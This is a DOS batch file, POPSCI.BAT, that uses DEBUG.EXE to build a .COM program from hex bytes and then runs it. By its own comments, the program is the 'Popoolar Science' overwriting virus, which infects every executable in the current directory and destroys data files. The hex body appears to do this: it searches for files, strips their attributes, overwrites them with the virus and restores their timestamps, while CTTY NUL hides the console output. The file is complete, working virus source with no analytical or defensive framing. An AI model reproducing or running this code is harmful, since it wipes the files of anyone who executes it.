   @echo off
   rem POPSCI.BAT will function correctly on machines employing MS-DOS 5.0
   rem in its default installation. That is, the program DEBUG.EXE must be
   rem in the DOS directory, which is where it normally is for anyone who
   rem has installed version 5.0 in the normal, hands-off, idiot proof fashion.
   rem POPSCI.BAT is a launcher for the POPOOLAR SCIENCE overwriting virus.
   rem Executing the file will create the virus in the current directory and
   rem call it. The virus will infect all executables in the current directory
   rem and mutilate all data files. If the program terminates without error and
   rem the virus has infected all files, the message "Popoolar Science Roolz"
   rem is displayed.

   SET PATH=C:\DOS
   CTTY NUL
   DEBUG <popsci.bat
   N POPSCI.COM
   E 0100 E9 00 00 0E 1F BA 79 01 B4 09 CD 21 BA 75 01 E8
   E 0110 05 00 B8 00 4C CD 21 55 B4 2F CD 21 53 89 E5 81
   E 0120 EC 80 00 52 B4 1A 8D 56 80 CD 21 B4 4E B9 27 00
   E 0130 5A CD 21 72 07 E8 0D 00 B4 4F EB F5 89 EC B4 1A
   E 0140 5A CD 21 5D C3 B4 2F CD 21 89 DE B8 01 43 33 C9
   E 0150 8D 54 1E CD 21 B8 02 3D CD 21 93 B4 40 B9 91 00
   E 0160 BA 00 01 CD 21 B8 01 57 8B 4C 16 8B 54 18 CD 21
   E 0170 B4 3E CD 21 C3 2A 2E 2A 00 50 6F 70 6F 6F 4C 61
   E 0180 72 20 53 63 49 65 6E 63 45 20 52 6F 6F 6C 5A 21
   E 0190 24
   RCX
   0091
   W
   Q
   CTTY CON
   POPSCI
